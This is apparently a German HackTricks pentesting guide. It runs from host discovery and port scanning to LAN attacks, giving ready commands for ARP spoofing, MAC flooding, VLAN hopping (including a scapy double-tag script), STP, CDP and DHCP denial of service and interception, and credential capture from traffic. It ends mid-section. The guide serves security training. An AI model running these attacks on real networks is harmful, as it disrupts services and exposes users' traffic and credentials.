# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Hosts von außen entdecken

Dies ist ein **kurzer Abschnitt** darüber, wie man **IPs responding** aus dem **Internet** findet.\
In diesem Fall hast du einen **scope of IPs** (vielleicht sogar mehrere **ranges**) und willst einfach herausfinden, **which IPs are responding**.

### ICMP

Dies ist der **einfachste** und **schnellste** Weg, um herauszufinden, ob ein Host online ist oder nicht.\
Du kannst versuchen, einige **ICMP**-Pakete zu senden und **Antworten zu erwarten**. Der einfachste Weg ist, einfach eine **echo request** zu senden und auf die Antwort zu warten. Das kannst du mit einem einfachen `ping` oder mit `fping` für **ranges** durchführen.\
Du kannst auch **nmap** verwenden, um andere Arten von ICMP-Paketen zu senden (das umgeht Filter gegen die üblichen ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Es ist sehr häufig, dass alle Arten von ICMP-Paketen gefiltert werden. Dann ist das Einzige, was du tun kannst, um zu prüfen, ob ein host up ist, **versuchen, open ports zu finden**. Jeder host hat **65535 ports**, daher kannst du bei einem "großen" scope **nicht** testen, ob **jeder port** bei jedem host offen ist oder nicht, das würde zu viel Zeit in Anspruch nehmen.\
Dann brauchst du einen **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) und eine Liste der **am häufigsten verwendeten ports:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Sie können diesen Schritt auch mit `nmap` durchführen, aber es ist langsamer und `nmap` hat teilweise Probleme, Hosts als 'up' zu erkennen.

### HTTP Port Discovery

Dies ist lediglich eine TCP-Port-Erkennung, nützlich, wenn Sie sich auf die **Entdeckung von HTTP** **services** konzentrieren möchten:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Du könntest auch versuchen zu prüfen, ob einige **UDP port open** existieren, um zu entscheiden, ob du einem **host** mehr **Aufmerksamkeit schenken** solltest. Da UDP services normalerweise **nicht antworten** und **keine Daten** auf ein reguläres leeres UDP probe packet zurücksenden, ist es schwierig zu sagen, ob ein port gefiltert ist oder offen. Der einfachste Weg, das zu entscheiden, ist, ein Paket zu senden, das zum laufenden Service passt; da du nicht weißt, welcher Service läuft, solltest du die wahrscheinlichsten basierend auf der Portnummer ausprobieren:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Die zuvor vorgeschlagene nmap-Zeile testet die **top 1000 UDP ports** auf jedem Host innerhalb des **/24**-Bereichs, aber allein das dauert **>20min**. Wenn du **schnellere Ergebnisse** brauchst, kannst du [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) verwenden: `./udp-proto-scanner.pl 199.66.11.53/24` Dieses Tool sendet diese **UDP probes** an ihre **erwarteten Ports** (für einen /24-Bereich dauert das nur 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Hier findest du einen guten Leitfaden zu allen bekannten Wifi-Angriffen zum Zeitpunkt der Erstellung:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Hosts von innen entdecken

Wenn du dich im Netzwerk befindest, ist eines der ersten Dinge, die du tun möchtest, **andere hosts zu entdecken**. Je nachdem, **wie viel Lärm** du erzeugen kannst/möchtest, können verschiedene Aktionen durchgeführt werden:

### Passiv

Du kannst diese Tools verwenden, um passiv hosts in einem verbundenen Netzwerk zu entdecken:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktiv

Beachte, dass die in [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) kommentierten Techniken hier ebenfalls **angewendet werden**.\
Aber da du dich im **same network** mit den anderen hosts befindest, kannst du **mehr tun**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktives ICMP

Beachte, dass die in _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) kommentierten Techniken auch **hier anwendbar** sind.\
Da du dich jedoch im **gleichen Netzwerk** wie die anderen Hosts befindest, kannst du **mehr machen**:

- Wenn du mit **ping** eine **Subnetz-Broadcast-Adresse** anpingst, sollte der Ping bei **jedem Host** ankommen und sie könnten **dir** **antworten**: `ping -b 10.10.5.255`
- Wenn du die **Netzwerk-Broadcast-Adresse** anpingst, kannst du sogar Hosts in **anderen Subnetzen** finden: `ping -b 255.255.255.255`
- Verwende die `-PE`, `-PP`, `-PM` Flags von `nmap`, um Host-Discovery durchzuführen; sie senden jeweils **ICMPv4 echo**, **timestamp**, und **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan wird verwendet, um Computer per **network message** **einzuschalten**. Das magic packet, das zum Einschalten des Computers verwendet wird, ist lediglich ein Paket, in dem eine **MAC Dst** angegeben ist und das anschließend **16 Mal** innerhalb desselben Pakets wiederholt wird.\
Solche Pakete werden üblicherweise in einem **ethernet 0x0842** oder in einem **UDP packet to port 9** gesendet.\
Wenn **no \[MAC]** angegeben ist, wird das Paket an das **broadcast ethernet** gesendet (und die Broadcast-MAC ist die, die wiederholt wird).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Hosts scannen

Sobald Sie alle IPs (extern oder intern) entdeckt haben, die Sie eingehender scannen möchten, können verschiedene Aktionen durchgeführt werden.

### TCP

- **Offener** Port: _SYN --> SYN/ACK --> RST_
- **Geschlossener** Port: _SYN --> RST/ACK_
- **Gefilterter** Port: _SYN --> \[KEINE ANTWORT]_
- **Gefilterter** Port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Es gibt 2 Optionen, einen UDP-Port zu scannen:

- Sende ein **UDP packet** und prüfe auf die Antwort _**ICMP unreachable**_, wenn der Port **geschlossen** ist (in vielen Fällen wird ICMP **gefiltert**, sodass du keine Informationen darüber erhältst, ob der Port geschlossen oder offen ist).
- Sende **formatierte Datagramme**, um eine Antwort von einem **Service** hervorzurufen (z. B. DNS, DHCP, TFTP und andere, wie in _nmap-payloads_ aufgelistet). Wenn du eine **Antwort** erhältst, ist der Port **offen**.

**Nmap** wird beide Optionen mit "-sV" **kombinieren** (UDP-Scans sind sehr langsam), aber beachte, dass UDP-Scans langsamer sind als TCP-Scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** wurde entwickelt, um zusammen mit **TCP (Transmission Control Protocol)** und **UDP (User Datagram Protocol)** verwendet zu werden. Sein Hauptzweck ist es, den Transport von Telefoniedaten über IP-Netzwerke zu ermöglichen und viele der Zuverlässigkeitsmerkmale von **Signaling System 7 (SS7)** widerzuspiegeln. **SCTP** ist ein Kernbestandteil der **SIGTRAN**-Protokollfamilie, die darauf abzielt, SS7-Signale über IP-Netzwerke zu transportieren.

Die Unterstützung für **SCTP** wird von verschiedenen Betriebssystemen bereitgestellt, wie **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, und **VxWorks**, was seine breite Akzeptanz und seinen Nutzen im Bereich Telekommunikation und Netzwerke zeigt.

Für **SCTP** bietet **nmap** zwei verschiedene Scans an: _-sY_ und _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Weitere nmap-Optionen**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Interne IP-Adressen aufdecken

**Fehlkonfigurierte Router, Firewalls und Netzwerkgeräte** antworten manchmal auf Netzwerksondierungen mit **nicht-öffentlichen Quelladressen**. **tcpdump** kann verwendet werden, um Pakete zu identifizieren, die während Tests von privaten Adressen empfangen werden. Konkret können unter Kali Linux Pakete auf der **eth2 interface** aufgezeichnet werden, die vom öffentlichen Internet aus zugänglich ist. Es ist wichtig zu beachten, dass, wenn Ihr Setup hinter einem NAT oder einer Firewall steht, solche Pakete wahrscheinlich herausgefiltert werden.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Mit Sniffing kann man Details zu IP‑Bereichen, Subnetzgrößen, MAC‑Adressen und Hostnames erfahren, indem man aufgezeichnete Frames und Pakete überprüft. Wenn das Netzwerk falsch konfiguriert ist oder die switching fabric unter Stress steht, können Angreifer sensible Daten durch passives network sniffing abgreifen.

Wenn ein switched Ethernet-Netzwerk korrekt konfiguriert ist, sehen Sie nur Broadcast‑Frames und Material, das an Ihre MAC‑Adresse adressiert ist.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Man kann auch Pakete von einer entfernten Maschine über eine SSH-Session in Echtzeit erfassen und Wireshark als GUI verwenden.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Offensichtlich.

### Credentials erfassen

Du kannst Tools wie [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) verwenden, um credentials aus einem pcap oder einem Live-Interface zu parsen.

## LAN-Angriffe

### ARP spoofing

ARP Spoofing besteht darin, gratuitous ARPResponses zu senden, um anzuzeigen, dass die IP einer Maschine die MAC-Adresse unseres Geräts hat. Dann ändert das Opfer die ARP-Tabelle und kontaktiert unser Gerät jedes Mal, wenn es die IP spoofed kontaktieren möchte.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Überflute die CAM-Tabelle des Switches, indem du viele Pakete mit unterschiedlichen Quell‑MAC‑Adressen sendest. Wenn die CAM-Tabelle voll ist, verhält sich der Switch wie ein hub (broadcastet den gesamten Verkehr).
```bash
macof -i <interface>
```
In modernen Switches wurde diese Schwachstelle behoben.

### 802.1Q VLAN / DTP Angriffe

#### Dynamic Trunking

Das **Dynamic Trunking Protocol (DTP)** ist als Schicht‑2‑Protokoll konzipiert, um ein automatisches System für Trunking bereitzustellen, das Switches ermöglicht, Ports automatisch für den Trunk‑Modus (Trunk) oder den Nicht‑Trunk‑Modus auszuwählen. Der Einsatz von **DTP** wird oft als Hinweis auf ein suboptimales Netzwerkdesign gewertet und unterstreicht die Bedeutung, Trunks nur dort manuell zu konfigurieren, wo nötig, sowie eine korrekte Dokumentation sicherzustellen.

Standardmäßig sind Switch‑Ports auf den Betrieb im Dynamic Auto mode eingestellt, d. h. sie sind bereit, Trunking zu initiieren, wenn ein benachbarter Switch es anfordert. Ein Sicherheitsproblem entsteht, wenn sich ein pentester oder Angreifer an den Switch anschließt und einen DTP Desirable frame sendet, wodurch der Port dazu gebracht wird, in den Trunk‑Modus zu wechseln. Dadurch kann der Angreifer VLANs über die Analyse von STP‑Frames auflisten und die VLAN‑Segmentierung umgehen, indem er virtual interfaces einrichtet.

Das Vorhandensein von DTP in vielen Switches standardmäßig kann von Angreifern ausgenutzt werden, um das Verhalten eines Switches zu imitieren und so Zugriff auf Traffic über alle VLANs zu erhalten. Das Script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) wird verwendet, um ein Interface zu überwachen und anzuzeigen, ob ein Switch im Default, Trunk, Dynamic, Auto oder Access mode ist — wobei letzterer die einzige Konfiguration ist, die gegen VLAN hopping attacks immun ist. Dieses Tool bewertet, ob der Switch verwundbar ist.

Wird eine Verwundbarkeit im Netzwerk festgestellt, kann das Tool _**Yersinia**_ eingesetzt werden, um über das DTP‑Protokoll "enable trunking" auszulösen, wodurch Pakete aus allen VLANs beobachtet werden können.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Um die VLANs zu enumerate, ist es auch möglich, das DTP Desirable frame mit dem script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. D**ie Ausführung des Scripts darf unter keinen Umständen unterbrochen werden. Es injiziert DTP Desirable alle drei Sekunden. **Die dynamisch erstellten trunk-Kanäle auf dem switch existieren nur fünf Minuten. Nach fünf Minuten fällt der trunk weg.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Ich möchte darauf hinweisen, dass **Access/Desirable (0x03)** anzeigt, dass der DTP frame vom Typ Desirable ist, der dem Port mitteilt, in den Trunk mode zu wechseln. Und **802.1Q/802.1Q (0xa5** zeigt den **802.1Q** Kapselungstyp an.

Durch die Analyse der STP frames **erfahren wir von der Existenz von VLAN 30 und VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Angreifen bestimmter VLANs

Sobald du die VLAN IDs und IP-Werte kennst, kannst du **ein virtual interface konfigurieren, um ein bestimmtes VLAN anzugreifen**.\
Wenn DHCP nicht verfügbar ist, verwende _ifconfig_, um eine statische IP-Adresse zu setzen.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Der diskutierte Angriff von **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** in anderen VLANs wird **automatisch ausgeführt** durch das Tool: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Wenn ein Angreifer den Wert der **MAC, IP and VLAN ID of the victim host** kennt, könnte er versuchen, einen Frame zu **double tag a frame** mit seinem zugewiesenen VLAN und dem VLAN des victim zu versehen und ein Paket zu senden. Da das **victim won't be able to connect back** zum Angreifer, ist die **beste Option für den Angreifer, via UDP zu kommunizieren** mit Protokollen, die interessante Aktionen ausführen können (wie SNMP).

Eine weitere Option für den Angreifer ist, einen **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** zu starten (wahrscheinlich über das Internet). Dann könnte der Angreifer auf dem zweiten von ihm kontrollierten Host sniffen, ob er Pakete vom victim erhält.

![](<../../images/image (190).png>)

Um diesen Angriff durchzuführen, kann man scapy verwenden: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

If you have **access to a switch that you are directly connected to**, you have the ability to **bypass VLAN segmentation** within the network. Simply **switch the port to trunk mode** (otherwise known as trunk), create virtual interfaces with the IDs of the target VLANs, and configure an IP address. You can try requesting the address dynamically (DHCP) or you can configure it statically. It depends on the case.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

In certain environments, such as guest wireless networks, **port isolation (also known as private VLAN)** settings are implemented to prevent clients connected to a wireless access point from directly communicating with each other. However, a technique has been identified that can circumvent these isolation measures. This technique exploits either the lack of network ACLs or their improper configuration, enabling IP packets to be routed through a router to reach another client on the same network.

The attack is executed by creating a **packet that carries the IP address of the destination client but with the router's MAC address**. This causes the router to mistakenly forward the packet to the target client. This approach is similar to that used in Double Tagging Attacks, where the ability to control a host accessible to the victim is used to exploit the security flaw.

**Wesentliche Schritte des Angriffs:**

1. **Crafting a Packet:** Ein packet wird gezielt erstellt, das die IP-Adresse des Zielclients enthält, aber mit der MAC-Adresse des router versehen ist.
2. **Exploiting Router Behavior:** Das erstellte packet wird an den router gesendet, der aufgrund der Konfiguration das packet an den Zielclient weiterleitet und damit die durch private VLAN-Einstellungen gebotene Isolation umgeht.

### VTP Attacks

VTP (VLAN Trunking Protocol) zentralisiert das VLAN-Management. Es verwendet Revisionsnummern, um die Integrität der VLAN-Datenbank zu gewährleisten; jede Änderung erhöht diese Nummer. Switches übernehmen Konfigurationen mit höheren Revisionsnummern und aktualisieren ihre eigenen VLAN-Datenbanken.

#### VTP Domain Roles

- **VTP Server:** Verwaltet VLANs — erstellt, löscht, ändert. Er sendet VTP announcements an die Domain-Mitglieder.
- **VTP Client:** Empfängt VTP announcements, um seine VLAN-Datenbank zu synchronisieren. Diese Rolle ist in lokalen VLAN-Konfigurationsänderungen eingeschränkt.
- **VTP Transparent:** Nimmt nicht an VTP updates teil, leitet jedoch VTP announcements weiter. Nicht von VTP attacks betroffen, behält es eine konstante Revisionsnummer von null bei.

#### VTP Advertisement Types

- **Summary Advertisement:** Vom VTP Server alle 300 Sekunden gesendet und enthält grundlegende Domain-Informationen.
- **Subset Advertisement:** Wird nach VLAN-Konfigurationsänderungen gesendet.
- **Advertisement Request:** Wird von einem VTP Client gesendet, um ein Summary Advertisement anzufordern, typischerweise als Reaktion auf das Erkennen einer höheren Konfigurations-Revisionsnummer.

VTP-Schwachstellen sind ausschließlich über trunk-Ports ausnutzbar, da VTP announcements nur über diese zirkulieren. Nach einem DTP-Angriff kann der Fokus auf VTP übergehen. Tools wie Yersinia können VTP attacks erleichtern, mit dem Ziel, die VLAN-Datenbank zu löschen und dadurch das Netzwerk effektiv zu stören.

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
In Yersinia's grafischen Modus wähle die Option deleting all VTP vlans, um die VLAN-Datenbank zu bereinigen.

### STP-Angriffe

**Wenn du auf deinen Schnittstellen keine BPDU-Frames erfassen kannst, ist es unwahrscheinlich, dass dir ein STP-Angriff gelingt.**

#### **STP BPDU DoS**

Durch das Senden vieler BPDUs vom Typ TCP (Topology Change Notification) oder Conf (die BPDUs, die gesendet werden, wenn die Topologie erstellt wird) werden die Switches überlastet und funktionieren nicht mehr korrekt.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Wenn ein TCP gesendet wird, wird die CAM table der switches nach 15s gelöscht. Wenn du dann kontinuierlich diese Art von packets sendest, wird die CAM table kontinuierlich neu gestartet (oder alle 15segs) und beim Neustart verhält sich der switch wie ein hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Der Angreifer simuliert das Verhalten von einem switch, um der STP root des Netzwerks zu werden. Dann wird mehr Datenverkehr durch ihn geleitet. Das ist interessant, wenn man mit zwei verschiedenen switches verbunden ist.\
Dies geschieht durch das Senden von BPDUs CONF packets, die aussagen, dass der **priority**-Wert kleiner ist als die tatsächliche priority des aktuellen root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Wenn der attacker mit 2 switches verbunden ist, kann er der root des neuen tree sein und der gesamte Traffic zwischen diesen switches wird durch ihn geleitet** (ein MITM attack wird durchgeführt).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP-Angriffe

CISCO Discovery Protocol (CDP) ist essenziell für die Kommunikation zwischen CISCO-Geräten und ermöglicht ihnen, **sich gegenseitig zu identifizieren und Konfigurationsdetails auszutauschen**.

#### Passive Datensammlung <a href="#id-0e0f" id="id-0e0f"></a>

CDP ist so konfiguriert, dass Informationen über alle Ports gesendet werden, was ein Sicherheitsrisiko darstellen kann. Ein Angreifer, der sich an einen Switch-Port anschließt, könnte Netzwerk-Sniffer wie **Wireshark**, **tcpdump** oder **Yersinia** einsetzen. Dies kann sensible Daten über das Netzwerkgerät offenlegen, einschließlich seines Modells und der Cisco IOS-Version, die darauf läuft. Der Angreifer könnte dann gezielt nach Schwachstellen in der identifizierten Cisco IOS-Version suchen.

#### Auslösen von CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Ein aggressiverer Ansatz besteht darin, einen Denial of Service (DoS)-Angriff zu starten, indem der Speicher des Switches überlastet wird, indem man vorgibt, legitime CISCO-Geräte zu sein. Nachfolgend die Befehlsabfolge, um einen solchen Angriff mit Yersinia, einem für Tests gedachten Netzwerktool, zu starten:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Während dieses Angriffs werden die CPU des Switches und die CDP-Nachbartabelle stark belastet, was aufgrund des übermäßigen Ressourcenverbrauchs häufig zu dem führt, was als **„Netzwerkparalyse“** bezeichnet wird.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Du kannst auch [**scapy**](https://github.com/secdev/scapy/) verwenden. Installiere es unbedingt mit dem `scapy/contrib`-Paket.

### VoIP-Angriffe und das VoIP Hopper Tool

VoIP-Telefone, die zunehmend mit IoT-Geräten integriert sind, bieten Funktionen wie das Entriegeln von Türen oder die Steuerung von Thermostaten über spezielle Telefonnummern. Diese Integration kann jedoch Sicherheitsrisiken bergen.

Das Tool [**voiphopper**](http://voiphopper.sourceforge.net) ist dafür ausgelegt, ein VoIP-Telefon in verschiedenen Umgebungen (Cisco, Avaya, Nortel, Alcatel-Lucent) zu emulieren. Es ermittelt die VLAN ID des Sprachnetzwerks mithilfe von Protokollen wie CDP, DHCP, LLDP-MED und 802.1Q ARP.

**VoIP Hopper** bietet drei Modi für das Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analysiert Netzwerkpakete, um die VLAN ID zu identifizieren.
2. **Spoof Mode** (`-c 1`): Erzeugt maßgeschneiderte Pakete, die denen eines echten VoIP-Geräts nachahmen.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Sendet Pakete, die mit denen eines bestimmten Cisco IP-Telefonmodells identisch sind.

Der bevorzugte Modus für Geschwindigkeit ist der dritte. Er erfordert die Angabe von:

- Die Netzwerk-Schnittstelle des Angreifers (`-i` parameter).
- Den Namen des emulierten VoIP-Geräts (`-E` parameter), entsprechend dem Cisco-Benennungsformat (z. B. SEP gefolgt von einer MAC-Adresse).

In Unternehmensumgebungen kann man, um ein bestehendes VoIP-Gerät zu imitieren:

- Das MAC-Etikett auf dem Telefon prüfen.
- Die Anzeige des Telefons in den Einstellungen auf Modellinformationen prüfen.
- Das VoIP-Gerät an ein Laptop anschließen und CDP-Anfragen mit Wireshark beobachten.

Ein Beispielbefehl, um das Tool im dritten Modus auszuführen, wäre:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP-Angriffe

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** können gegen DHCP-Server durchgeführt werden. Die erste besteht darin, **genügend gefälschte Hosts zu simulieren, um alle möglichen IP-Adressen zu belegen**.\
Dieser Angriff funktioniert nur, wenn man die Antworten des DHCP-Servers sehen und das Protokoll komplett durchlaufen kann (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Zum Beispiel ist das **nicht möglich in Wifi networks**.

Eine andere Möglichkeit, einen DHCP DoS durchzuführen, ist das Versenden eines **DHCP-RELEASE Packet, das jede mögliche IP als Quelladresse verwendet**. Dann wird der Server denken, dass alle aufgehört haben, die IP zu benutzen.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Eine automatisiertere Methode dafür ist die Verwendung des Tools [DHCPing](https://github.com/kamorin/DHCPig)

Du könntest die erwähnten DoS-Angriffe nutzen, um Clients dazu zu zwingen, neue Leases innerhalb der Umgebung zu beziehen, und legitime Server so zu erschöpfen, dass sie nicht mehr reagieren. Wenn die legitimen dann versuchen, sich erneut zu verbinden, kannst du **bösartige Werte bereitstellen, die im nächsten Angriff erwähnt werden**.

#### Bösartige Werte setzen

Ein rogue DHCP server kann mit dem DHCP-Skript unter /usr/share/responder/DHCP.py eingerichtet werden. Das ist nützlich für Netzwerkangriffe, z. B. zum Abfangen von HTTP-Traffic und Anmeldeinformationen, indem Traffic auf einen bösartigen Server umgeleitet wird. Das Setzen eines rogue Gateway ist jedoch weniger effektiv, da es nur ausgehenden Traffic vom Client erfasst und die Antworten des echten Gateways verpasst. Stattdessen wird empfohlen, einen rogue DNS- oder WPAD-Server einzurichten, um einen wirkungsvolleren Angriff durchzuführen.

Nachfolgend die Kommandooptionen zur Konfiguration des rogue DHCP-Servers:

